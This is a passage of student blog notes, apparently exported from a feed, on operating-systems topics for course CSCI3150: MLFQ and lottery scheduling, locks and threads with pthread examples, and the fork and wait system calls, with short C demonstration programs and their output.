<li>Job B: an intensive job that need the CPU only for 1ms before performing an I&#x2F;O request <img src="https://p.ipic.vip/8t6xdj.png" width="350px"></li>
<li>According to rule 4b, MLFQ approach keeps an interactive job at the highest priority.</li>
</ul>
</li>
</ol>
<h4 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h4><ol>
<li><p>Starvation</p>
<ul>
<li>If there are many interactive jobs in the system, the long-running jobs will never receive any CPU time.</li>
</ul>
</li>
<li><p>Game the schedule</p>
<ul>
<li>After running 99% of a time slice, issue an I&#x2F;O operation, and the job can gain a higher percentage of CPU time.</li>
<li>i.e., A job will give up the CPU when it almost reach the time slice, so that it can keep the high priority.</li>
</ul>
</li>
<li><p>A program may change its behavior over time</p>
<ul>
<li>i.e., CPU bound process → I&#x2F;O bound process</li>
</ul>
</li>
</ol>
<h4 id="Improvements"><a href="#Improvements" class="headerlink" title="Improvements"></a>Improvements</h4><ol>
<li><p>Priority Boost</p>
<ul>
<li><p>Rule 5: <font color="F54747">After some time period S, move all the jobs to the topmost queue (highest priority)</font></p>
</li>
<li><p>Example:</p>
<ul>
<li>A long-running job A with two short-running interactive job B and C</li>
<li>It will induce starvation of A, Rule 5 can avoid this situation.  <img src="https://p.ipic.vip/0mj9j8.png" width="500px"></li>
</ul>
</li>
</ul>
</li>
<li><p>Prevent gaming of scheduler</p>
<ul>
<li><p>Improvement on rule 4:</p>
</li>
<li><p>Rule 4: <font color="F54747">Once a job uses up its time allotment at a given level</font> (regardless of how many times it has given up the CPU), <font color="F54747">its priority is reduced</font></p>
</li>
<li><p>Example:</p>
  <img src="https://p.ipic.vip/b1ghgu.png" width="500px"></li>
</ul>
</li>
<li><p>Tuning MLFQ</p>
<ul>
<li><font color="F54747">Lower Priority, Longer Quanta (time slice)</font></li>
<li>The high-priority queues → Short time slice</li>
<li>The low-priority queues → Longer time slice <img src="https://p.ipic.vip/jqklbl.png" width="350px"></li>
</ul>
</li>
</ol>
<h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><ul>
<li>The refined set of MLFQ Rules:<ol>
<li>If Priority(A) &gt; Priority(B), A runs</li>
<li>If Priority(A) &#x3D; Priority(B), A &amp; B run in Round Robin</li>
<li>When a job enters the system, it is placed at the highest priority</li>
<li>Once a job uses up its time allotment at a given level, its priority is reduced</li>
<li>After some time period S, move all the jobs in the system to the topmost queue</li>
</ol>
</li>
</ul>
<h3 id="Proportional-Share"><a href="#Proportional-Share" class="headerlink" title="Proportional Share"></a>Proportional Share</h3><ul>
<li>A fair-share scheduler<ul>
<li>Guarentee that each job obtain a certain percentage of CPU time</li>
<li>Not optimized for turnaround time or response time</li>
</ul>
</li>
</ul>
<h4 id="Lottery-Scheduling"><a href="#Lottery-Scheduling" class="headerlink" title="Lottery Scheduling"></a>Lottery Scheduling</h4><ol>
<li><p>Tickets</p>
<ul>
<li>Represent the share of a resource that a process should receive.</li>
<li>The percentage of tickets represents its share of the system resource.</li>
</ul>
</li>
<li><p>Scheduling</p>
<ul>
<li>The scheduler picks a winning ticket, then, load the state of winning process and runs it. <img src="https://p.ipic.vip/jsrfi9.png" width="500px"></li>
</ul>
</li>
<li><p>Ticket Mechanisms</p>
<ol>
<li><p>Ticket Currency</p>
<ul>
<li>A user can allocate tickets among their own jobs in a currency.</li>
<li>The system converts the currency into the correct global value.</li>
</ul>
</li>
<li><p>Ticket Transfer</p>
<ul>
<li>A process can <font color="3A75EA">temporarily hand off</font> its tickets to another process.</li>
</ul>
</li>
<li><p>Ticket Inflation</p>
<ul>
<li>A process can <font color="3A75EA">temporarily change</font> the umber of tickets it owns.</li>
<li>If any one process needs more CPU time, it can boost its tickets.</li>
</ul>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Concurrency (Lock &amp; Conditional Variable)</title>
    <url>/myBlog/2022/12/07/2022/CSCI3150/2022-12-7-CSCI3150-Concurrency-Lock-ConditionalVariable.md/</url>
    <content><![CDATA[<h2 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h2><h3 id="mutex"><a href="#mutex" class="headerlink" title="mutex"></a>mutex</h3><ul>
<li>Used to provide mutual exclusion between threads</li>
<li>We may use <font color="3A75EA">different locks</font> to protect <font color="3A75EA">different variables</font>, to increase concurrency</li>
</ul>
<h3 id="Design-Lock"><a href="#Design-Lock" class="headerlink" title="Design Lock"></a>Design Lock</h3><ul>
<li><p>Evaluating Locks</p>
<ol>
<li><p>Mutual Exclusion</p>
<ul>
<li>it can prevent multiple threads from entering a critical section.</li>
</ul>
</li>
<li><p>Fairness</p>
<ul>
<li>each thread gets a fair shot at acquiring the lock if the lock is free.</li>
</ul>
</li>
<li><p>Performance</p>
<ul>
<li>the time overheads added by using the lock</li>
</ul>
</li>
</ol>
</li>
<li><p>Controlling Interrupts</p>
<ul>
<li><font color="3A75EA"><strong>Disable Interrupts</strong></font> for critical sections<ul>
<li>the earliest solution to provide mutual exclusion</li>
<li>invented for single processor systems.</li>
<li>Problems:<ol>
<li>Do not work on multiprocessors</li>
<li>Code that masks or unmasks interrupts be executed slowly by modern CPUs</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Concurrency (Thread)</title>
    <url>/myBlog/2022/12/07/2022/CSCI3150/2022-12-7-CSCI3150-Concurrency-Thread/</url>
    <content><![CDATA[<h2 id="Thread"><a href="#Thread" class="headerlink" title="Thread"></a>Thread</h2><ul>
<li><p>A new abstraction for a single running process.</p>
</li>
<li><p>Switch between threads</p>
<ul>
<li><p>Each thread has it own <font color="3A75EA">program counter</font> and <font color="3A75EA">set of registers</font></p>
<ul>
<li>so, each thread has its own stack.</li>
</ul>
</li>
<li><p>When switching from running thread (T1) to other (T2)</p>
<ol>
<li>Save the register state of T1</li>
<li>Restore the register state of T2</li>
</ol>
<ul>
<li>The address space remains the same</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Concurrency-Problem"><a href="#Concurrency-Problem" class="headerlink" title="Concurrency Problem"></a>Concurrency Problem</h3><ul>
<li><p>Problem Example:</p>
<ul>
<li>Thread: <ul>
<li>A function runs within the same memory space.</li>
<li>Each thread starts running in a routine call <code>worker()</code> (real program).</li>
</ul>
</li>
</ul>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> loops;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">worker</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loops; i++) &#123;</span><br><span class="line">        counter++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: threads &lt;value&gt;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    loops = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="type">pthread_t</span> p1, p2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Initial value : %d\n&quot;</span>, counter);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;p1, <span class="literal">NULL</span>, worker, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;p2, <span class="literal">NULL</span>, worker, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(p1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(p2, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Final value : %d\n&quot;</span>, counter);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>./x 100</code></p>
<ul>
<li>Initial value : 0</li>
<li>Final value : 200</li>
</ul>
</li>
<li><p><code>./x 10000000</code></p>
<ul>
<li>Initial value : 0</li>
<li>Final value : 10096682</li>
</ul>
</li>
<li><p>Since when we do increment, it takes 3 instructions:</p>
<ol>
<li>Load the value of counter from the memory to the register</li>
<li>Increment it</li>
<li>Store it back to the memory</li>
</ol>
<ul>
<li>But these 3 instructions do not execute atomically, so the problem of concurrency happened.</li>
</ul>
</li>
</ul>
</li>
<li><p>Solution:</p>
<ul>
<li><p>Critical Section</p>
<ul>
<li>A piece of code that <font color="3A75EA">accesses a shared variable</font>, must not be concurrently executed by more than one thread.<ul>
<li>So, multiple threads which execute the critical section should result in a race condition</li>
<li>Need to support atomicity for critical sections</li>
</ul>
</li>
</ul>
</li>
<li><p>Lock</p>
<ul>
<li>To ensure that the critical section can execute only if it was a single automic instruction  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">lock_t</span> mutex;</span><br><span class="line">...</span><br><span class="line">lock(&amp;mutex);</span><br><span class="line"><span class="comment">/* Critical Section */</span></span><br><span class="line">balance = balance + <span class="number">1</span></span><br><span class="line">unlock(&amp;mutex);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Thread-API"><a href="#Thread-API" class="headerlink" title="Thread API"></a>Thread API</h2><h3 id="Thread-Creation"><a href="#Thread-Creation" class="headerlink" title="Thread Creation"></a>Thread Creation</h3><ul>
<li><p>Used to create a thread</p>
</li>
<li><p>Syntax: </p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">pthread_t</span>* thread,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">pthread_attr_t</span>* attr,</span></span><br><span class="line"><span class="params">    <span class="type">void</span>* (*start_routine)(<span class="type">void</span>*),</span></span><br><span class="line"><span class="params">    <span class="type">void</span>* arg</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>thread</code>: interact with this thread (id)</li>
<li><code>attr</code>: to specify any attributes this thread might have</li>
<li><code>start_routine</code>: the function this thread start running in</li>
<li><code>arg</code>: the argument to be passed to the function</li>
</ul>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">myarg_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">&#125; <span class="type">myarg_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mythread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">myarg_t</span> *m = (<span class="type">myarg_t</span> *) arg;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, m-&gt;a, m-&gt;b);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> p;</span><br><span class="line">    <span class="type">int</span> rc;</span><br><span class="line">    <span class="type">myarg_t</span> args;</span><br><span class="line">    args.a = <span class="number">10</span>;</span><br><span class="line">    args.b = <span class="number">20</span>;</span><br><span class="line">    rc = pthread_create(&amp;p, <span class="literal">NULL</span>, mythread, &amp;args);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Thread-Wait"><a href="#Thread-Wait" class="headerlink" title="Thread Wait"></a>Thread Wait</h3><ul>
<li><p>Used to wait for a thread to complete</p>
</li>
<li><p>Syntax: <code>int pthread_join(pthread_t thread, void **value_ptr);</code></p>
<ul>
<li><code>thread</code>: the thread that wait for</li>
<li><code>value_ptr</code>: a pointer to the return value</li>
</ul>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">myarg_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">&#125; <span class="type">myarg_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">myret_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125; <span class="type">myret_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mythread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">myarg_t</span> *m = (<span class="type">myarg_t</span> *) arg;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, m-&gt;a, m-&gt;b);</span><br><span class="line">    <span class="type">myret_t</span> *r = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">myret_t</span>));</span><br><span class="line">    r-&gt;x = <span class="number">1</span>;</span><br><span class="line">    r-&gt;y = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *) r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> rc;</span><br><span class="line">    <span class="type">pthread_t</span> p;</span><br><span class="line">    <span class="type">myret_t</span> *m;</span><br><span class="line">    </span><br><span class="line">    <span class="type">myarg_t</span> args;</span><br><span class="line">    args.a = <span class="number">10</span>;</span><br><span class="line">    args.b = <span class="number">20</span>;</span><br><span class="line">    pthread_create(&amp;p, <span class="literal">NULL</span>, mythread, &amp;args);</span><br><span class="line">    pthread_join(p, (<span class="type">void</span> **) &amp;m);  <span class="comment">// this thread has been	</span></span><br><span class="line">                                    <span class="comment">// waiting inside of the 			</span></span><br><span class="line">                    <span class="comment">// pthread_join() routine.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;returned %d %d\n&quot;</span>, m-&gt;x, m-&gt;y);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h3><ul>
<li><p>Provide <font color="3A75EA">mutual exclusion</font> to a cirtical section</p>
</li>
<li><p>Interface:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_lock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_unlock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Usage:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pthread_mutex_t</span> lock;</span><br><span class="line">pthread_mutex_lock(&amp;lock);</span><br><span class="line"><span class="comment">/* Critical Section ... */</span></span><br><span class="line">pthread_mutex_unlock(&amp;lock);</span><br></pre></td></tr></table></figure>
<ul>
<li>If there is no other thread holds the lock, then the thread will acquire the lock and <font color="F54747">enter the critical section</font>.</li>
<li>If another thread holds the lock, then the thread will <font color="F54747">not return from the call until it has acquired the lock</font>.</li>
</ul>
</li>
<li><p>Check Errors:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// First way</span></span><br><span class="line"><span class="type">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Second way</span></span><br><span class="line"><span class="type">int</span> rc = pthread_mutex_init(&amp;lock, <span class="literal">NULL</span>);</span><br><span class="line">assert(rc == <span class="number">0</span>);    <span class="comment">// always check success!</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Pthread_mutex_lock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span> &#123;</span><br><span class="line">    <span class="type">int</span> rc = pthread_mutex_lock(mutex);</span><br><span class="line">    assert(rc == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Lock Acquistion</p>
<ol>
<li><p>Return failure if the lock is already held</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_trylock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Return after a timeout or after acquiring the lock</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_timelock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex, <span class="keyword">struct</span> timespec *abs_timeout)</span>;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - System Call (Process)</title>
    <url>/myBlog/2022/09/17/2022/CSCI3150/2022-9-16-CSCI3150-SystemCall-Process/</url>
    <content><![CDATA[<h2 id="Processes"><a href="#Processes" class="headerlink" title="Processes"></a>Processes</h2><h3 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h3><ol>
<li><p>A process contains:</p>
<ul>
<li>A unique ID</li>
<li>A thread of control</li>
<li>Some private data</li>
</ul>
</li>
<li><p>Parent-Child Links:</p>
<ul>
<li>parent process: executes the request for creation of a process</li>
<li>child process: the created process</li>
<li>Noted: A child process inherits <font color="f54747">all the properties of its parent</font> when it is created.</li>
</ul>
</li>
</ol>
<h3 id="Process-ID"><a href="#Process-ID" class="headerlink" title="Process ID"></a>Process ID</h3><ol>
<li><p>Process ID (PID): </p>
<ul>
<li>Each process has a unique ID number.</li>
<li>It’s use to identify different processes.</li>
</ul>
</li>
<li><p>User ID (UID):</p>
<ul>
<li>Each user has a unique user ID.</li>
<li>Each process is associated with the the owner of the process, the owner has privileges with respect to the process.</li>
</ul>
</li>
<li><p>Obtain ID in C:</p>
<ol>
<li><p><code>getpid()</code> - obtain the child’s PID.</p>
</li>
<li><p><code>getppid()</code> - obtain the parent’s PID.</p>
</li>
<li><p><code>getuid()</code> - obtain the owner’s UID.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 1-getpid */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>   <span class="comment">// printf()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  <span class="comment">// getpid()</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;My PID is %d, UID is %d, My Parent PID is %d\n&quot;</span>,</span><br><span class="line">        getpid(), getuid(), getppid());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    My PID is 4003, UID is 501, My Parent PID is 3843</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>Obtain ID in terminal:</p>
<ol>
<li><code>ps</code> - lists the current processes.</li>
<li><code>ps -a</code> - lists more processes, including the processes that being run by other users and at other terminals.</li>
<li><code>ps -l</code> - prints more information lines, including UID, PID, PPID, process status, etc.</li>
</ol>
</li>
</ol>
<h2 id="Process-Operations"><a href="#Process-Operations" class="headerlink" title="Process Operations"></a>Process Operations</h2><h3 id="fork-System-Call"><a href="#fork-System-Call" class="headerlink" title="fork System Call"></a><code>fork</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>To create a process (child process).</li>
</ul>
</li>
<li><p>Syntax: <code>int fork()</code></p>
</li>
<li><p>Return:</p>
<ul>
<li>To child: return <font color="f54747">0</font></li>
<li>To parent: return <font color="f54747">child’s PID</font></li>
</ul>
</li>
</ul>
<img src="https://p.ipic.vip/bmx0k0.png" width="500px"/>



<ul>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 2-fork */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> ret_from_fork;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before: my pid is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    ret_from_fork = fork();     <span class="comment">// create a child</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After: my pid is %d, return value from fork():%d\n&quot;</span>,</span><br><span class="line">                getpid(), ret_from_fork);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Before: my pid is 3991</span></span><br><span class="line"><span class="comment">    After: my pid is 3994, return value from fork():0</span></span><br><span class="line"><span class="comment">    After: my pid is 3991, return value from fork():3994</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>Task:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* How many child processes were created? */</span></span><br><span class="line">fork();</span><br><span class="line">fork();</span><br><span class="line">fork();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 6-3fork */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    fork();</span><br><span class="line">    fork();</span><br><span class="line">    fork();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PID - %d, PPID -%d\n&quot;</span>, getpid(), getppid());</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    PID - 5207, PPID -5141</span></span><br><span class="line"><span class="comment">    PID - 5210, PPID -5207</span></span><br><span class="line"><span class="comment">    PID - 5209, PPID -5207</span></span><br><span class="line"><span class="comment">    PID - 5211, PPID -5209</span></span><br><span class="line"><span class="comment">    PID - 5208, PPID -5207</span></span><br><span class="line"><span class="comment">    PID - 5213, PPID -5208</span></span><br><span class="line"><span class="comment">    PID - 5212, PPID -5208</span></span><br><span class="line"><span class="comment">    PID - 5214, PPID -5212</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="wait-System-Call"><a href="#wait-System-Call" class="headerlink" title="wait System Call"></a><code>wait</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>After <code>fork()</code> system call, both parent and child proceed <font color="f54747">independently</font>.</li>
<li>Therefore, if a parent wants to wait unitl the child finishes, then executes <code>wait()</code> or <code>waitpid()</code>.</li>
</ul>
</li>
<li><p>Syntax: <code>pid_t wait(int *stat)</code></p>
<ul>
<li><code>stat</code>: the child process</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>If because a child terminated: return <font color="f54747">the PID of that child</font></li>
<li>Otherwise, return <font color="f54747">-1</font></li>
</ul>
</li>
<li><p>Working Process:</p>
<ul>
<li>it causes the caller process to pause,<ul>
<li><font color="7B3279">until the a child terminates or stops</font>, or</li>
<li><font color="7B3279">until the caller recieves a signal</font></li>
</ul>
</li>
<li>it returns right away,<ul>
<li>if <font color="7B3279">the process has no child</font>, or </li>
<li>if <font color="7B3279">the child has already terminated or stopped but has not yet been waited for</font></li>
</ul>
</li>
</ul>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 7-mywait */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">5</span>;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="type">pid_t</span> waitreturn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// repeat 5 times</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="comment">// create a child then break -&gt; new process becomes parent</span></span><br><span class="line">        <span class="keyword">if</span>((childpid = fork()) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait the child precess terminates</span></span><br><span class="line">    <span class="keyword">if</span>((waitreturn = wait(&amp;status)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// if there is no child (wait returns -1 which &lt; 0)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wait(): Returns - %d.\n&quot;</span>, waitreturn);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I am process %d, my parent is %d, childpid:%d, i:%d\n&quot;</span>,</span><br><span class="line">        getpid(), getppid(), childpid, i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    wait(): Returns - -1.</span></span><br><span class="line"><span class="comment">    I am process 4119, my parent is 4118, childpid:0, i:5</span></span><br><span class="line"><span class="comment">    I am process 4118, my parent is 4117, childpid:4119, i:4</span></span><br><span class="line"><span class="comment">    I am process 4117, my parent is 4116, childpid:4118, i:3</span></span><br><span class="line"><span class="comment">    I am process 4116, my parent is 4115, childpid:4117, i:2</span></span><br><span class="line"><span class="comment">    I am process 4115, my parent is 3843, childpid:4116, i:1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="exec-System-Call"><a href="#exec-System-Call" class="headerlink" title="exec System Call"></a><code>exec</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>To change processes.</li>
